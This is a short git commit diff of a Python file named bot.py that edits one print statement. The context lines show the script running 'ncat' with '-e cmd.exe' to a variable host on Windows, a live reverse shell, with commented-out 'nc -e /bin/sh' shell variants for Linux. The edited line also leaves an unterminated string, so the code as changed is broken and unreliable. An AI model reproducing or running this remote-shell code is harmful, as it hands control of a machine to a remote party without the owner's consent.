6f3afdb50ac12924014fe480bc7201e66ec687d7
kaki714 <123768052+kaki714@users.noreply.github.com>
2023-02-21 17:05:19 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -27,7 +27,7 @@ def run():
         #os.system( 'nc -lvp 734 -e /bin/sh')
         #os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
-        print('Windows: ', sysconfig.get_platform()) 
+        print('Windows: ', sysconfig.get_platform(),' === Co) 
         print('Address ip: ', IPAddr)
         #os.system('ncat -lvp 734 -e cmd.exe')
         os.system('ncat '+ iph +' 734 -e cmd.exe')
